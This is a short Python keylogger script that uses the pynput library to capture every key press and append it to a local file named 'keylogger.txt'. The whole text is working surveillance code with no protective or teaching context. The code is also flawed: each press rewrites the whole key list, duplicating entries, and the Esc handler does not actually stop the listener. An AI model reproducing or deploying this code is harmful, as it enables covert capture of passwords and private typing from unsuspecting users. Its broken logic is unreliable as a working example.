from pynput.keyboard import Key, Listener

s = []


def on_press(key):
  s.append(key)
  server(s)
  print(key)

def server(var):
  with open("keylogger.txt", "a") as f:
    for i in var:
      new_var = str(i).replace("'", '')

      f.write(new_var)
      f.write(" ")

def on_release(key):
  if key == Key.esc:
    return None



with Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()
